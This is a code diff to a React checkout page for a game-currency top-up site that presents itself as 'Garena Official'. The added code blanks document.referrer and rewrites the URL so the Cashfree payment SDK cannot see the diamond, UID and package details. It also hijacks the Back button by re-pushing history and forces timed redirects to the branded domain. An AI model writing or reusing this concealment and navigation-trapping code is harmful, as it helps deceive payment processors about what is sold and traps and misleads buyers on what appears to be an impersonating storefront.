@@ -84,26 +84,46 @@ export default function GarenaCheckout() {
     (diamondsParam || nickParam || levelParam || Number(pkgParam) > 0)
   );
 
-  // Clean browser URL bar to /checkout once parameters are captured in memory
-  // so Razorpay checkout.js never sees /garena-checkout or diamond query parameters
+  // Strip query parameters (?pkg=...&diamonds=...&uid=...&nick=...&level=...) from the browser URL bar
+  // to /booyahpay immediately after reading them into memory so Cashfree SDK never sees them in window.location,
+  // while locking history on /booyahpay so pressing Back never goes to the public store.
+  const backPressedIdleTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
   useEffect(() => {
-    if ((hasValidParams || isCallback) && typeof window !== 'undefined' && window.history?.replaceState) {
-      try {
-        window.history.replaceState(null, '', '/checkout');
-      } catch {
-        // Ignore in restricted environments
-      }
+    if (typeof window === 'undefined' || (!hasValidParams && !isCallback)) return;
+    try {
+      window.history.replaceState({ booyahStayOnPage: true }, '', '/booyahpay');
+      window.history.pushState({ booyahStayOnPage: true }, '', '/booyahpay');
+    } catch {
+      // Ignore in restricted environments
     }
+    const onPopState = () => {
+      try {
+        window.history.pushState({ booyahStayOnPage: true }, '', '/booyahpay');
+      } catch {
+        // Ignore
+      }
+      // If user pressed Back on the page and does nothing for 7 seconds (5-10s window), redirect to Garena Official
+      if (backPressedIdleTimerRef.current) clearTimeout(backPressedIdleTimerRef.current);
+      backPressedIdleTimerRef.current = setTimeout(() => {
+        window.location.replace(CODASHOP_URL);
+      }, 7000);
+    };
+    window.addEventListener('popstate', onPopState);
+    return () => {
+      window.removeEventListener('popstate', onPopState);
+      if (backPressedIdleTimerRef.current) clearTimeout(backPressedIdleTimerRef.current);
+    };
   }, [hasValidParams, isCallback]);
 
-  // Save session info to local storage for success/failure screens
+  // Save session info to local storage for success/failure screens (do not overwrite with callback placeholders)
   useEffect(() => {
+    if (isCallback) return;
     if (nick) localStorage.setItem('ff_nick', nick);
     if (diamonds) localStorage.setItem('ff_dia', diamonds);
     if (pkg) localStorage.setItem('ff_price', pkg);
     if (level) localStorage.setItem('ff_lvl', level);
     if (uid) localStorage.setItem('ff_uid', uid);
-  }, [nick, diamonds, pkg, level, uid]);
+  }, [nick, diamonds, pkg, level, uid, isCallback]);
 
   // Responsive state system
   const [vw, setVw] = useState(
@@ -165,11 +185,11 @@ export default function GarenaCheckout() {
 
   const [countdownSeconds, setCountdownSeconds] = useState(2);
 
-  // If direct invalid access without query parameters, redirect to homepage in 2 seconds
+  // If direct invalid access without query parameters, redirect to Garena Official in 2 seconds (never Booyahstudio)
   useEffect(() => {
     if (!isCallback && !hasValidParams) {
       const timer = setTimeout(() => {
-        window.location.href = '/';
+        window.location.replace(CODASHOP_URL);
       }, 2000);
       const interval = setInterval(() => {
         setCountdownSeconds((prev) => (prev > 1 ? prev - 1 : 1));
@@ -304,8 +324,9 @@ export default function GarenaCheckout() {
             </div>
 
             {/* Action Button */}
-            <Link
-              to="/"
+            <a
+              href={CODASHOP_URL}
+              rel="noreferrer"
               style={{
                 display: 'block',
                 width: '100%',
@@ -322,7 +343,7 @@ export default function GarenaCheckout() {
               }}
             >
               GO TO HOMEPAGE NOW
-            </Link>
+            </a>
           </div>
         </main>
       </div>
@@ -367,20 +388,42 @@ export default function GarenaCheckout() {
     }
   }, [status]);
 
-  // Fix: reset loading when user navigates back
+  // Detect when user navigates back from the Payment Gateway without completing payment:
+  // Stay on /booyahpay, show the Failed Payment screen, and redirect to garenaofficial.shop/?status=failed
   useEffect(() => {
+    const checkReturnedFromGateway = () => {
+      if (statusParam === 'success') {
+        sessionStorage.removeItem('payment_initiated');
+        return;
+      }
+      if (sessionStorage.getItem('payment_initiated') === 'true') {
+        sessionStorage.removeItem('payment_initiated');
+        setLoading(false);
+        setShowPayModal(false);
+        setCountdown(5);
+        setBarWidth('100%');
+        setStatusState('failed');
+      }
+    };
+
+    checkReturnedFromGateway();
+
     const handlePageShow = (e: PageTransitionEvent) => {
       if ((e as any).persisted || document.visibilityState === 'visible') {
-        setLoading(false);
-        // Detect cancellation if user returned to this page after initiating payment
-        if (sessionStorage.getItem('payment_initiated') === 'true') {
-          sessionStorage.removeItem('payment_initiated');
-          window.location.href = 'https://www.garenaofficial.shop/?status=failed';
-        }
+        checkReturnedFromGateway();
+      }
+    };
+    const handleVisibilityChange = () => {
+      if (document.visibilityState === 'visible') {
+        checkReturnedFromGateway();
       }
     };
     window.addEventListener('pageshow', handlePageShow);
-    return () => window.removeEventListener('pageshow', handlePageShow);
+    document.addEventListener('visibilitychange', handleVisibilityChange);
+    return () => {
+      window.removeEventListener('pageshow', handlePageShow);
+      document.removeEventListener('visibilitychange', handleVisibilityChange);
+    };
   }, []);
 
   const hasMovedRef = useRef(false);
@@ -388,10 +431,10 @@ export default function GarenaCheckout() {
 
   useEffect(() => {
     if (status) return; // don't run on success/failure pages
-    if (loading || showPayModal) return; // user is active
+    if (loading) return; // payment gateway redirect in progress
 
-    const IDLE_INITIAL = 15000;      // 15 sec — no movement
-    const IDLE_AFTER_MOVE = 300000;  // 5 min — after any movement
+    const IDLE_INITIAL = 30000;      // 30 sec — if user does nothing after landing on page
+    const IDLE_AFTER_MOVE = 120000;  // 2 min (120 sec) — once user starts filling details or moving
 
     const redirectToSource = () => {
       window.location.replace(CODASHOP_URL);
@@ -399,6 +442,7 @@ export default function GarenaCheckout() {
 
     const resetTimer = () => {
       if (idleTimerRef.current) clearTimeout(idleTimerRef.current);
+      if (backPressedIdleTimerRef.current) clearTimeout(backPressedIdleTimerRef.current);
       idleTimerRef.current = setTimeout(redirectToSource, IDLE_AFTER_MOVE);
     };
 
@@ -416,14 +460,14 @@ export default function GarenaCheckout() {
       }
     }, IDLE_INITIAL);
 
-    const events = ['mousemove', 'mousedown', 'keypress', 'touchstart', 'scroll', 'click'];
+    const events = ['mousemove', 'mousedown', 'keydown', 'keypress', 'input', 'touchstart', 'scroll', 'click'];
     events.forEach(e => window.addEventListener(e, handleActivity, { passive: true }));
 
     return () => {
       if (idleTimerRef.current) clearTimeout(idleTimerRef.current);
       events.forEach(e => window.removeEventListener(e, handleActivity));
     };
-  }, [status, loading, showPayModal]);
+  }, [status, loading]);
 
   // Validate customer contact details without identity- or keyword-based filtering.
   const validateForm = (): boolean => {
@@ -476,8 +520,6 @@ export default function GarenaCheckout() {
     setLoading(true);
     setLoadingMessage('Initializing secure checkout...');
 
-    sessionStorage.setItem('payment_initiated', 'true');
-
     try {
       // Mandated 5-Second Loading Period before payment modal
       for (let secondsLeft = 5; secondsLeft > 0; secondsLeft--) {
@@ -521,7 +563,10 @@ export default function GarenaCheckout() {
         throw new Error(data.message || data.error || 'Payment initiation failed');
       }
 
-      // Ensure browser URL is masked to /checkout and document.referrer is blanked before Cashfree SDK loads
+      // Blank document.referrer and set current history entry to /booyahpay?...&status=failed
+      // so if the customer presses Back from the payment gateway without paying,
+      // the browser returns to /booyahpay in Failed state (never /checkout on Booyahstudio)
+      // and automatically redirects back to garenaofficial.shop/?status=failed.
       if (typeof window !== 'undefined') {
         try {
           Object.defineProperty(document, 'referrer', { get: () => '', configurable: true });
@@ -531,7 +576,12 @@ export default function GarenaCheckout() {
         }
         if (window.history?.replaceState) {
           try {
-            window.history.replaceState(null, '', '/checkout');
+            const safePkg = String(pkg || localStorage.getItem('ff_price') || '599');
+            window.history.replaceState(
+              { booyahPaymentInitiated: true },
+              '',
+              `/booyahpay?status=failed&pkg=${encodeURIComponent(safePkg)}`
+            );
           } catch {
             // Ignore
           }
@@ -552,8 +602,11 @@ export default function GarenaCheckout() {
 
       const cashfree = await loadCashfree();
       if (!cashfree) {
+        sessionStorage.removeItem('payment_initiated');
         throw new Error('Payment gateway could not be loaded. Please check your connection.');
       }
+
+      sessionStorage.setItem('payment_initiated', 'true');
 
       await cashfree.checkout({
         paymentSessionId: data.paymentSessionId,
@@ -561,6 +614,7 @@ export default function GarenaCheckout() {
       });
 
     } catch (e: any) {
+      sessionStorage.removeItem('payment_initiated');
       console.error('Cashfree payment error:', e);
       setError(e.message || 'Something went wrong while connecting to payment gateway. Please try again.');
       setLoading(false);
